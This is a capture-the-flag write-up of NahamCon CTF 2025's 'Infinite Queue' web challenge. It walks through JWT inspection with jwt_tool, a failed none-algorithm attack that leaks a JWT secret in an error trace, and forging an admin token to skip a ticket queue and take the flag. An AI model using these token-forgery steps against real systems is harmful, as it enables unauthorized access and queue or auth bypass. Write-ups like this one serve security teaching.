---
name: Infinite Queue (2025)
event: NahamCon CTF 2025
category: Web
description: Writeup for Infinite Queue (Web) - NahamCon CTF (2025) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Infinite Queue

## Description

> Oh my god, I just can't with these concert ticket queues. It's gotten out of control.

## Solution

We get through to a band website for `Infinite Queue`, pretty cool.

![](images/0.PNG)

If we click the `Buy Tickets` option, we'll be placed in a queue for a very long time.

![](images/1.PNG)

Checking burp, we see that the `queue_position` is retrieved by sending a JWT token to `/check_queue`. Check the details with [jwt_tool](https://github.com/ticarpi/jwt_tool)

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiJyIsInF1ZXVlX3RpbWUiOjE3NTM4ODc4NDEuODM4ODM2LCJleHAiOjUzNDgwMzA1MjF9.r8zkmJfULj4j9XoPBiO69Gra5xAGvsotV0XoYZVE-Cs

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] user_id = "'"
[+] queue_time = 1753887841.838836
[+] exp = 5348030521    ==> TIMESTAMP = 2139-06-22 13:02:01 (UTC)
```

{% endcode %}

The token is signed with `HS256`, symmetric encryption. I try to crack it with rockyou, but fail.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiJyIsInF1ZXVlX3RpbWUiOjE3NTM4ODc4NDEuODM4ODM2LCJleHAiOjUzNDgwMzA1MjF9.r8zkmJfULj4j9XoPBiO69Gra5xAGvsotV0XoYZVE-Cs -C -d /usr/share/wordlists/rockyou.txt
```

{% endcode %}

Try it with the `None` alg.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiJyIsInF1ZXVlX3RpbWUiOjE3NTM4ODc4NDEuODM4ODM2LCJleHAiOjUzNDgwMzA1MjF9.r8zkmJfULj4j9XoPBiO69Gra5xAGvsotV0XoYZVE-Cs -X a

EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiJyIsInF1ZXVlX3RpbWUiOjE3NTM4ODc4NDEuODM4ODM2LCJleHAiOjUzNDgwMzA1MjF9.
```

{% endcode %}

I actually got a big error trace from using this token.

{% code overflow="wrap" %}

```json
"error_details":{"debug_mode":false,"environment":{"GPG_KEY":"E3FF2839C048B25C084DEBE9B26995E310250568","HOME":"/root","HOSTNAME":"infinite-queue-68fe983afb25c760-584ffc466-5f47l","JWT_SECRET":"4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC","KUBERNETES_PORT":"tcp://34.118.224.1:443","KUBERNETES_PORT_443_TCP":"tcp://34.118.224.1:443","KUBERNETES_PORT_443_TCP_ADDR":"34.118.224.1","KUBERNETES_PORT_443_TCP_PORT":"443","KUBERNETES_PORT_443_TCP_PROTO":"tcp","KUBERNETES_SERVICE_HOST":"34.118.224.1","KUBERNETES_SERVICE_PORT":"443","KUBERNETES_SERVICE_PORT_HTTPS":"443","LANG":"C.UTF-8","PATH":"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","PYTHON_SHA256":"8c136d199d3637a1fce98a16adc809c1d83c922d02d41f3614b34f8b6e7d38ec","PYTHON_VERSION":"3.9.22","WERKZEUG_SERVER_FD":"3"},"error":"The specified alg value is not allowed","request_data":{"token":"eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiJyIsInF1ZXVlX3RpbWUiOjE3NTM4ODc4NDEuODM4ODM2LCJleHAiOjUzNDgwMzA1MjF9."},"time":"2025-05-23T21:24:36.552750"}
```

{% endcode %}

The notable part is `The specified alg value is not allowed`. I try the JWT editor extension in burp with a few different attacks too, e.g. signing with empty key returns `Signature verification failed`.

Wait, I just realised the `JWT_SECRET` is in the response lol.

{% code overflow="wrap" %}

```
4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC
```

{% endcode %}

We can test it with the JWT tool.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiJyIsInF1ZXVlX3RpbWUiOjE3NTM4ODc4NDEuODM4ODM2LCJleHAiOjUzNDgwMzA1MjF9.r8zkmJfULj4j9XoPBiO69Gra5xAGvsotV0XoYZVE-Cs -C -p 4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC

Password provided, checking if valid...
[+] CORRECT key found:
4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC"
```

{% endcode %}

OK, we follow it's instructions while setting the queue time to `0`.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiJyIsInF1ZXVlX3RpbWUiOjE3NTM4ODc4NDEuODM4ODM2LCJleHAiOjUzNDgwMzA1MjF9.r8zkmJfULj4j9XoPBiO69Gra5xAGvsotV0XoYZVE-Cs -S hs256 -p "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC" -T
```

{% endcode %}

I set the `user_id` to `admin` and the `queue_time` to `1.0`.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJxdWV1ZV90aW1lIjoxLjAsImV4cCI6NTM0ODAzMDUyMX0.CWzWY422QgpBwUJwbeU-tdDyfQ7s1zhinbj6TKMbk74

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] user_id = "admin"
[+] queue_time = 1.0
[+] exp = 5348030521    ==> TIMESTAMP = 2139-06-22 13:02:01 (UTC)
```

{% endcode %}

When we update the token in burp, we get some good news.

{% code overflow="wrap" %}

```json
{ "message": "Your turn has arrived! You can now purchase tickets.", "status": "ready" }
```

{% endcode %}

We can now purchase the ticket.

![](images/2.PNG)

It opens a PDF document containing the flag!

Flag: `flag{b1bd4795215a7b81699487cc7e32d936}`
